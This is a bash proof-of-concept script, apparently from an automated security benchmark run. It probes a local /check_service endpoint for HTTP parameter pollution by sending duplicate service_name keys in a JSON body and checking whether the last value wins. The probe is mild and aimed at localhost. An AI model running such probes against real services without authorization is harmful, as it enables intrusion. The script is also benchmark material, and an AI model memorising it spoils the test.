#!/bin/bash
# POC: Demonstrates HTTP Parameter Pollution (HPP) via duplicate service_name parameters in JSON request body, showing that the last parameter value is used instead of the first
# Target: ./repo
# Created: 2025-11-07T17:21:26.068Z
# Session: benchmark-XBEN-068-24-mhp49w3p

# HTTP Parameter Pollution (HPP) POC - Duplicate Parameter Handling
# This script demonstrates HPP vulnerability in /check_service endpoint
# where duplicate parameters in JSON body allow parameter pollution

TARGET="http://127.0.0.1:80"
ENDPOINT="/check_service"
URL="${TARGET}${ENDPOINT}"

echo "=========================================="
echo "HTTP Parameter Pollution (HPP) POC"
echo "Target: $URL"
echo "=========================================="
echo ""

# Test 1: Normal request with single parameter
echo "[TEST 1] Normal request with single parameter"
echo "Command: curl -X POST $URL -H 'Content-Type: application/json' -d '{\"service_name\":\"apache\"}'"
echo ""
RESPONSE1=$(curl -s -X POST "$URL" -H 'Content-Type: application/json' -d '{"service_name":"apache"}')
echo "Response: $RESPONSE1"
echo ""

# Extract the service_name value from response
SERVICE1=$(echo "$RESPONSE1" | grep -o '"service_name":"[^"]*"' | cut -d'"' -f4)
echo "Extracted service_name: $SERVICE1"
echo ""
echo "---"
echo ""

# Test 2: Request with duplicate parameters - testing last value wins
echo "[TEST 2] Request with duplicate parameters (last value should be used)"
echo "JSON Payload: {\"service_name\":\"apache\", \"service_name\":\"malicious\"}"
echo ""
# Note: Using printf to ensure proper JSON formatting with duplicate keys
RESPONSE2=$(curl -s -X POST "$URL" -H 'Content-Type: application/json' -d '{"service_name":"apache","service_name":"malicious"}')
echo "Response: $RESPONSE2"
echo ""

# Extract the service_name value from response
SERVICE2=$(echo "$RESPONSE2" | grep -o '"service_name":"[^"]*"' | cut -d'"' -f4)
echo "Extracted service_name: $SERVICE2"
echo ""

# Check if HPP vulnerability is present
echo "---"
echo ""
echo "[ANALYSIS]"
if [ "$SERVICE1" == "apache" ] && [ "$SERVICE2" == "malicious" ]; then
    echo "✓ HTTP Parameter Pollution CONFIRMED"
    echo "  - First parameter: $SERVICE1"
    echo "  - With duplicate payload, result: $SERVICE2"
    echo "  - The last parameter value is being used, confirming HPP vulnerability"
    exit 0
elif [ "$SERVICE1" == "apache" ] && [ "$SERVICE2" == "apache" ]; then
    echo "✓ Proper handling detected: First parameter value is consistently used"
    echo "  - Both tests returned: apache"
    exit 1
else
    echo "? Unexpected behavior:"
    echo "  - Test 1 result: $SERVICE1"
    echo "  - Test 2 result: $SERVICE2"
    exit 2
fi